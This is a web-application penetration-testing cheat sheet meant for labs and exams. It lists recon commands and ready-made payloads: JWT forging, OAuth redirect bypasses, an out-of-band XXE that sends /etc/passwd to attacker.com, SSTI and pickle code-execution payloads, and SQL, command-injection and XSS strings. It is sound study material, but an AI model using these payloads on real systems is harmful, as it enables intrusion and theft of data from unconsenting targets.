# Advanced Web Application Exploitation - Quick Reference Cheat Sheet

---

## Reconnaissance

### Subdomain Enumeration
```bash
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com
```

### Directory Discovery
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://target.com -w wordlist.txt
```

### Technology Detection
```bash
whatweb target.com
wafw00f target.com
```

### JavaScript Analysis
```bash
# Extract endpoints from JS
curl https://target.com/app.js | grep -oE '"/[^"]*"' | sort -u
```

---

## Authentication Attacks

### JWT Testing

**Decode JWT:**
```bash
echo "PAYLOAD" | base64 -d | jq
```

**jwt_tool - All attacks:**
```bash
python3 jwt_tool.py <TOKEN> -M at
```

**Crack Secret:**
```bash
python3 jwt_tool.py <TOKEN> -C -d wordlist.txt
```

**Forge Token:**
```bash
python3 jwt_tool.py <TOKEN> -T -pc role -pv admin -S hs256 -p "secret"
```

**Common JWT Attacks:**
- Algorithm confusion: Change "alg" to "none"
- Weak secret: Brute-force with wordlist
- Algorithm switch: RS256 → HS256 using public key
- KID injection: Path traversal, SQL injection in "kid" header

### SAML Attacks

**Test Signature Removal:**
```xml
<!-- Remove entire <ds:Signature> element -->
```

**Signature Wrapping:**
```xml
<!-- Inject second unsigned assertion before signed one -->
```

### OAuth/SSO

**Test Missing State:**
```http
GET /oauth/authorize?client_id=X&redirect_uri=Y
# (no state parameter)
```

**redirect_uri Bypass:**
```
https://app.com@attacker.com
https://app.com.attacker.com
https://app.com?next=https://attacker.com
```

---

## Password Reset

### Host Header Injection
```http
POST /password-reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@example.com
```

### Rate Limit Bypass
```python
headers = {'X-Forwarded-For': f'10.0.{i}.{j}'}
```

**Other Headers to Try:**
- X-Real-IP
- X-Originating-IP
- X-Client-IP
- CF-Connecting-IP
- True-Client-IP

---

## Business Logic

### Mass Assignment
```json
POST /api/register
{
  "username": "test",
  "password": "pass",
  "role": "admin",           // Extra!
  "is_admin": true,          // Extra!
  "credits": 999999          // Extra!
}
```

### IDOR Testing
```bash
# Change IDs
GET /api/users/1234 → /api/users/1235

# Negative numbers
GET /api/users/-1

# UUID prediction
# Check if sequential or time-based
```

### HTTP Parameter Pollution
```http
GET /api/data?user_id=attacker&user_id=victim
```

### Race Conditions
```python
import concurrent.futures

def exploit():
    return requests.post(url, data=data)

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(exploit) for _ in range(50)]
```

---

## API Testing

### REST API

**CRUD Testing:**
```bash
GET    /api/users/1    # Read
POST   /api/users      # Create
PUT    /api/users/1    # Update
DELETE /api/users/1    # Delete
PATCH  /api/users/1    # Partial update
```

**HTTP Method Tampering:**
```http
# If POST is blocked, try:
PUT, PATCH, DELETE, OPTIONS, HEAD
```

**API Versioning:**
```bash
/api/v1/endpoint  # May have weaker security
/api/v2/endpoint  # Newer, more secure
```

### GraphQL

**Introspection:**
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

**Batch Queries:**
```graphql
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}
```

**Field Suggestions:**
```graphql
query {
  user {
    idd  # Typo reveals actual fields
  }
}
```

### gRPC

```bash
# List services
grpcurl -plaintext target.com:50051 list

# Call method
grpcurl -plaintext -d '{"id": 1}' \
  target.com:50051 UserService/GetUser
```

---

## XXE (XML External Entity)

### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Out-of-Band (OOB)
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

**evil.dtd:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### XXE via SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16">&xxe;</text>
</svg>
```

---

## Cryptography

### Padding Oracle

```bash
# PadBuster
./padbuster.pl http://target.com/page \
  <ENCRYPTED> 8 \
  -cookies "auth=<ENCRYPTED>"
```

### Hash Length Extension

```bash
./hash_extender \
  --data 'original_data' \
  --secret-length 8 \
  --append '&admin=true' \
  --signature <KNOWN_SIG> \
  --format sha256
```

---

## Remote Code Execution

### Server-Side Template Injection (SSTI)

**Detection:**
```
{{7*7}}         # Jinja2: 49
${7*7}          # FreeMarker: 49
<%= 7*7 %>      # ERB: 49
```

**Jinja2 RCE:**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

**Twig RCE:**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

### Deserialization

**PHP:**
```bash
# Generate payload
./phpggc Laravel/RCE1 system whoami
```

**Java:**
```bash
# ysoserial
java -jar ysoserial.jar CommonsCollections6 'calc.exe'
```

**Python Pickle:**
```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
```

### Git Exposure

```bash
# Download .git
./git-dumper.py http://target.com/.git /output

# Extract code
cd /output
git checkout -- .

# Find secrets
grep -r "password\|secret\|api_key" .
```

---

## Burp Suite Tips

### Keyboard Shortcuts
- `Ctrl+R` - Send to Repeater
- `Ctrl+I` - Send to Intruder
- `Ctrl+Shift+B` - Base64 encode
- `Ctrl+Shift+U` - URL encode

### Useful Extensions
- JWT Editor
- Autorize (Authorization testing)
- Param Miner
- Turbo Intruder
- SAML Raider

### Match and Replace Rules

**Force HTTPS:**
- Type: Request line
- Match: `^http://`
- Replace: `https://`

**Remove CSP:**
- Type: Response header
- Match: `Content-Security-Policy: .*`
- Replace: (empty)

---

## Python Exploitation Scripts

### Template Script
```python
#!/usr/bin/env python3

import requests
import sys

def exploit(url, target_id):
    session = requests.Session()

    # Login
    login = session.post(f'{url}/api/login',
                        json={'username': 'user', 'password': 'pass'})

    if login.status_code != 200:
        print("[-] Login failed")
        return

    token = login.json()['token']

    # Exploit IDOR
    response = session.get(f'{url}/api/users/{target_id}',
                          headers={'Authorization': f'Bearer {token}'})

    if response.status_code == 200:
        print(f"[+] Success! Data: {response.json()}")
    else:
        print(f"[-] Failed: {response.status_code}")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <target_id>")
        sys.exit(1)

    exploit(sys.argv[1], sys.argv[2])
```

### Async Requests (Fast)
```python
import aiohttp
import asyncio

async def exploit():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(100):
            task = session.get(f'https://target.com/api/users/{i}')
            tasks.append(task)

        responses = await asyncio.gather(*tasks)
        for resp in responses:
            print(await resp.text())

asyncio.run(exploit())
```

---

## Common Payloads

### SQL Injection
```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### NoSQL Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### Command Injection
```bash
; whoami
| whoami
`whoami`
$(whoami)
& whoami
&& whoami
|| whoami
```

### XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
'"><script>alert(1)</script>
```

---

## Response Status Codes

| Code | Meaning | Security Implication |
|------|---------|---------------------|
| 200 | OK | Success |
| 201 | Created | Resource created |
| 301 | Moved Permanently | Check redirect location |
| 302 | Found | Temporary redirect |
| 400 | Bad Request | Input validation |
| 401 | Unauthorized | Auth required |
| 403 | Forbidden | Auth present, access denied |
| 404 | Not Found | May be fake (test with POST/PUT) |
| 405 | Method Not Allowed | Try other HTTP methods |
| 500 | Internal Server Error | May reveal stack trace |
| 503 | Service Unavailable | Potential DoS |

---

## Security Headers

### Good Headers (Look for Missing)
```http
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
```

### Bad Headers (Indicators of Vulnerability)
```http
Access-Control-Allow-Origin: *
X-Powered-By: PHP/7.2.0
Server: Apache/2.4.41 (Ubuntu)
```

---

## Wordlists

### Common Locations
```bash
# Kali Linux
/usr/share/wordlists/
/usr/share/wordlists/dirb/
/usr/share/wordlists/dirbuster/
/usr/share/seclists/

# SecLists (highly recommended)
git clone https://github.com/danielmiessler/SecLists.git
```

### Useful Lists
- `common.txt` - Common directories/files
- `rockyou.txt` - Common passwords
- `big.txt` - Large directory list
- `api-endpoints.txt` - API paths
- `subdomains-top1million-5000.txt` - Subdomains

---

## Reporting

### Severity Rating

| Rating | CVSS | Description |
|--------|------|-------------|
| Critical | 9.0-10.0 | RCE, Authentication Bypass (admin) |
| High | 7.0-8.9 | SQL Injection, XXE, Deserialization |
| Medium | 4.0-6.9 | IDOR, XSS, Information Disclosure |
| Low | 0.1-3.9 | Missing headers, Version disclosure |

### Vulnerability Template
```markdown
## [Vulnerability Name]

**Severity:** Critical/High/Medium/Low

**Description:**
Brief description of the vulnerability

**Steps to Reproduce:**
1. Step 1
2. Step 2
3. Step 3

**Proof of Concept:**
```http
[Include request/response or code]
```

**Impact:**
What an attacker can achieve

**Remediation:**
How to fix it

**References:**
- OWASP link
- CVE (if applicable)
```

---

## Emergency Commands

### Kill All Python Scripts
```bash
pkill -9 python
pkill -9 python3
```

### Reset Burp Proxy
```bash
# If Burp hangs
killall -9 java
# Restart Burp Suite
```

### Clear iptables (if locked out)
```bash
iptables -F
iptables -X
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
```

### Check Open Ports
```bash
netstat -tlnp
ss -tlnp
lsof -i -P -n
```

---

## Useful One-Liners

### Extract URLs from JS
```bash
curl -s https://target.com/app.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
```

### Find Subdomains in Certificate Transparency
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### Quick Port Scan
```bash
nmap -T4 -p- --min-rate=1000 target.com
```

### Grep for Secrets
```bash
grep -r -i "api_key\|password\|secret\|token" .
```

### Base64 Encode/Decode
```bash
echo "text" | base64
echo "dGV4dAo=" | base64 -d
```

---

## Resources

### Practice Platforms
- PortSwigger Web Security Academy
- HackTheBox
- TryHackMe
- PentesterLab
- OWASP WebGoat

### Documentation
- OWASP Testing Guide
- PortSwigger Research
- HackerOne Disclosed Reports
- Bug Bounty Write-ups

### Tools Repository
- GitHub: SecLists
- GitHub: PayloadsAllTheThings
- GitHub: OWASP CheatSheet Series

---

**Print this cheat sheet for quick reference during labs and exams!**
